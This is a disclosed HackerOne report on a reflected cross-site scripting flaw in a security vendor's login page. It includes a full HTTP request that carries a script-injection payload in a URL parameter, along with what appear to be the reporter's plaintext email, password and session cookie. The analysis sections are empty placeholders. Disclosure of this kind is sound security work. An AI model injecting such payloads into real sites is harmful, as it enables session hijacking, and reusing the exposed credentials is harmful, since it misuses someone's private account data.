---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '9735'
original_report_id: '9735'
title: Reflected cross site scripting in login page
weakness: Cross-site Scripting (XSS) - Generic
team_handle: stopthehacker
created_at: '2014-04-25T12:56:31.976Z'
disclosed_at: '2014-09-07T18:17:42.304Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected cross site scripting in login page

## Metadata

- HackerOne Report ID: 9735
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: stopthehacker
- Disclosed At: 2014-09-07T18:17:42.304Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

It was observed that the application is vulnerable to cross-site scripting (XSS). XSS is a type of attack that involves running a malicious scripts on a victim’s browser. Once exploited It is possible to steal or manipulate a legitimate user’s session credentials including session cookies.

Request :

POST /login/process?e22ec"><script>alert(1)</script>edff4caab65=1 HTTP/1.1
Host: panel.stopthehacker.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://panel.stopthehacker.com/login
Cookie: __utma=154329338.42246299.1398423628.1398423628.1398425435.2; __utmc=154329338; __utmz=154329338.1398423628.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); sth_panel=G%2CbOpqGLFXVqHBPLdVJcD2; __utma=66990511.534853050.1398423714.1398423714.1398427276.2; __utmc=66990511; __utmz=66990511.1398427276.2.2.utmcsr=stopthehacker.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmb=154329338.1.9.1398427271588; __utmb=66990511.2.10.1398427276
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=robincool031%40gmail.com&password=259733%40ramani&login=&csrf=33ed08e46e14d0622ff36ad779654418

Cheers
Robin

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
